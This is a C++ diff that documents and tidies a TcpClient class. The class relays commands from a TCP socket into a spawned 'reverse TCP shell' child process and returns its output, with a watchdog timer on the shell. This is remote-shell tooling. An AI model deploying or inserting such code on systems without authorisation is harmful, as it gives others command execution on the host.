@@ -8,17 +8,29 @@
 namespace
 {
 
-void RemoveCtrlChars(std::string& s)
+/*
+ *  @brief  Remove control characters from a string.
+ *
+ *  @param  messageString the string to sanitize.
+ */
+void RemoveCtrlChars(std::string &messageString)
 {
-    s.erase(std::remove_if(s.begin(), s.end(),
+    messageString.erase(std::remove_if(messageString.begin(), messageString.end(),
         [](char c)
         {
             const bool isNewLine = ('\n' == c);
             const bool shouldRemove = std::iscntrl(c) && !isNewLine;
             return shouldRemove;
-        }), s.end());
+        }), messageString.end());
 }
 
+/*
+ *  @brief  Get the connection information string.
+ *
+ *  @param  socket the asio tcp socket object reference.
+ * 
+ *  @return string identifying the connection.
+ */
 std::string ConnectionString(const asio::ip::tcp::socket &socket)
 {
     std::ostringstream ss;
@@ -37,12 +49,12 @@ std::string ConnectionString(const asio::ip::tcp::socket &socket)
 
 } // namespace
 
-const asio::chrono::milliseconds TcpClient::CHILD_WATCH_TIMER_DURATION = asio::chrono::milliseconds(100);
+const asio::chrono::milliseconds TcpClient::WATCH_TIMER_DURATION = asio::chrono::milliseconds(100);
 
 TcpClient::TcpClient(asio::io_context &ioContext) :
     m_ioContext(ioContext),
     m_socket(m_ioContext),
-    m_childWatchTimer(m_ioContext, CHILD_WATCH_TIMER_DURATION)
+    m_childWatchTimer(m_ioContext, WATCH_TIMER_DURATION)
 {
     // const asio::socket_base::keep_alive keepAliveOption(true);
     // m_socket.set_option(keepAliveOption);
@@ -56,11 +68,14 @@ void TcpClient::Start()
 {
     m_pReverseTcpShellTask.reset(new Task::ReverseTcpShell(m_ioContext));
 
+    //! Schedule reads from the socket and shell before starting the reverse tcp shell
+    //! to avoid missing data after starting.
     ReadFromSocket();
     ReadFromShell();
 
     if (!m_pReverseTcpShellTask->Start())
     {
+        //! Close connection if the tcp shell fails to start.
         std::cout << ConnectionString(m_socket) << " - unable to start shell." << '\n';
 
         Cancel();
@@ -69,13 +84,9 @@ void TcpClient::Start()
     {
         std::cout << ConnectionString(m_socket) << " - started shell." << '\n';
         
+        //! Start the child shell process watchdog timer.
         m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
     }
-}
-
-asio::ip::tcp::socket &TcpClient::GetSocket()
-{
-    return m_socket;
 }
 
 void TcpClient::Cancel()
@@ -116,11 +127,14 @@ void TcpClient::OnReadFromSocket(const asio::error_code &error, const size_t nBy
         return;
     }
 
+    //! Sanitize the received shell command by removing control characters.
     std::string message = std::string(std::istreambuf_iterator<char>(&m_socketInputBuffer), std::istreambuf_iterator<char>());
     RemoveCtrlChars(message);
 
+    //! Send sanitized shell command to the shell process.
     WriteToShell(message);
 
+    //! Schedule another asynchronous read from the client.
     ReadFromSocket();
 }
 
@@ -141,9 +155,6 @@ void TcpClient::OnWriteToShell(const asio::error_code &error, const size_t nByte
 
 void TcpClient::ReadFromShell()
 {
-    // asio::async_read_until(m_pReverseTcpShellTask->GetParentSocket(), m_shellInputBuffer, "\n",
-        // std::bind(&TcpClient::OnReadFromShell, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
-    
     m_pReverseTcpShellTask->GetParentSocket().async_read_some(asio::buffer(m_shellInputBuffer, m_shellInputBuffer.size()),
         std::bind(&TcpClient::OnReadFromShell, shared_from_this(), std::placeholders::_1, std::placeholders::_2));
 }
@@ -158,14 +169,13 @@ void TcpClient::OnReadFromShell(const asio::error_code &error, const size_t nByt
         return;
     }
 
-    // std::string message = std::string(std::istreambuf_iterator<char>(&m_shellInputBuffer), std::istreambuf_iterator<char>());
+    //! Assign the standard output data obtained from the child shell process into
+    //! a string and send it to the client through the tcp socket.
     std::string message;
     message.assign(m_shellInputBuffer.data(), nBytesTransferred);
-    
-    // RemoveCtrlChars(message);
-
     WriteToSocket(message);
-
+    
+    //! Schedule another asynchronous read from the shell.
     ReadFromShell();
 }
 
@@ -173,21 +183,27 @@ void TcpClient::CheckShellAlive(const asio::error_code &error)
 {
     if (!m_pReverseTcpShellTask)
     {
-        m_childWatchTimer.expires_at(m_childWatchTimer.expiry() + CHILD_WATCH_TIMER_DURATION);
+        //! If the task object doesn't exist yet, schedule another timer and return.
+        m_childWatchTimer.expires_at(m_childWatchTimer.expiry() + WATCH_TIMER_DURATION);
         m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
+        
         return;
     }
 
     if (m_pReverseTcpShellTask->HasShellTerminated())
     {
         //! Child terminated.
+
+        //! If the child process has exited, cancel all the scheduled asio io operations
+        //! and close the connection.
         std::cout << ConnectionString(m_socket) << " - shell child terminated, pid=" << m_pReverseTcpShellTask->GetShellPid() << '\n';
         
         Cancel();
     }
     else
     {
-        m_childWatchTimer.expires_at(m_childWatchTimer.expiry() + CHILD_WATCH_TIMER_DURATION);
+        //! If the child process is still alive, schedule another timer.
+        m_childWatchTimer.expires_at(m_childWatchTimer.expiry() + WATCH_TIMER_DURATION);
         m_childWatchTimer.async_wait(std::bind(&TcpClient::CheckShellAlive, shared_from_this(), std::placeholders::_1));
     }
 }
